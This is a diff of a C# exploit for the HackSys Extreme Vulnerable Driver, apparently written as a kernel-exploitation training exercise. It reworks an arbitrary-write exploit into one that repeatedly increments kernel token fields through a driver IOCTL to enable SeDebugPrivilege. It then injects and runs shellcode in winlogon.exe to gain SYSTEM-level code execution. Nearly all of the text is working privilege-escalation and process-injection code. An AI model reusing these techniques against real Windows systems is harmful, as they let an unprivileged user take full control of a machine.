@@ -2,7 +2,7 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace ArbitraryWrite
+namespace ArbitraryIncrement
 {
     class Program
     {
@@ -271,36 +271,33 @@ namespace ArbitraryWrite
             return ObjectPointer;
         }
 
-        static void WritePointer(IntPtr hDevice, IntPtr where, IntPtr what)
+        static void IncrementKernelData(IntPtr hDevice, IntPtr kernelAddress)
         {
-            uint ioctl = 0x22200B;
-            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
-            IntPtr whatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
-            Marshal.Copy(BitConverter.GetBytes(what.ToInt64()), 0, whatBuffer, IntPtr.Size);
-            IntPtr[] inputArray = new IntPtr[2];
-            inputArray[0] = whatBuffer; // what
-            inputArray[1] = where; // where
-            Marshal.Copy(inputArray, 0, inputBuffer, 2);
+            uint ioctl = 0x222073;
+            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.Copy(BitConverter.GetBytes(kernelAddress.ToInt64()), 0, inputBuffer, IntPtr.Size);
 
-            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
+            DeviceIoControl(hDevice, ioctl, inputBuffer, IntPtr.Size,
                 IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
 
-            Marshal.FreeHGlobal(whatBuffer);
             Marshal.FreeHGlobal(inputBuffer);
         }
 
-        static void OverwriteToken(IntPtr hDevice, IntPtr tokenPointer)
+        static void EnableSeDebugPrivilege(IntPtr hDevice, IntPtr tokenPointer)
         {
-            IntPtr pointerParent = new IntPtr(tokenPointer.ToInt64() + 0x40);
-            IntPtr pointerEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48);
-            IntPtr pointerEnabledByDefault = new IntPtr(tokenPointer.ToInt64() + 0x50);
+            IntPtr pointerParent = new IntPtr(tokenPointer.ToInt64() + 0x40 + 2);
+            IntPtr pointerEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48 + 2);
+            IntPtr pointerEnabledByDefault = new IntPtr(tokenPointer.ToInt64() + 0x50 + 2);
             IntPtr[] targets = { pointerParent, pointerEnabled, pointerEnabledByDefault };
 
-            Console.WriteLine("[>] Trying to overwrite token");
+            Console.WriteLine("[>] Trying to enable SeDebugPrivilege");
 
             foreach (IntPtr target in targets)
             {
-                WritePointer(hDevice, target, new IntPtr(-1));
+                for (var i = 0; i < 2; i++)
+                {
+                    IncrementKernelData(hDevice, target);
+                }
             }
         }
 
@@ -352,7 +349,7 @@ namespace ArbitraryWrite
             Console.WriteLine("[>] Injecting shellcode to the winlogon process");
 
             IntPtr hProcess = OpenProcess(
-                PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
+                PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                 false, winlogon);
 
             if (hProcess == IntPtr.Zero)
@@ -389,7 +386,7 @@ namespace ArbitraryWrite
             Console.WriteLine("[+] {0} bytes shellcode is written in winlogon process", ReturnedBytes);
 
             IntPtr lpflOldProtect = Marshal.AllocHGlobal(IntPtr.Size);
-            status = VirtualProtectEx(hProcess, Buffer, shellcode.Length, 
+            status = VirtualProtectEx(hProcess, Buffer, shellcode.Length,
                 PAGE_EXECUTE_READ, lpflOldProtect);
             Marshal.FreeHGlobal(lpflOldProtect);
 
@@ -422,7 +419,7 @@ namespace ArbitraryWrite
 
         static void Main()
         {
-            Console.WriteLine("--[ HEVD Exploitation : Arbitrary Write\n");
+            Console.WriteLine("--[ HEVD Exploitation : Arbitrary Increment\n");
 
             if (!IsWin10x64())
             {
@@ -463,10 +460,10 @@ namespace ArbitraryWrite
 
             Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));
 
-            // Step 3: Token Stealing
-            OverwriteToken(hDevice, tokenPointer);
+            // Step 3: Enable SeDebugPrivilege
+            EnableSeDebugPrivilege(hDevice, tokenPointer);
             CloseHandle(hDevice);
-            
+
             // Step 4: Code Injection to winlogon.exe
             if (InjectToWinlogon())
             {
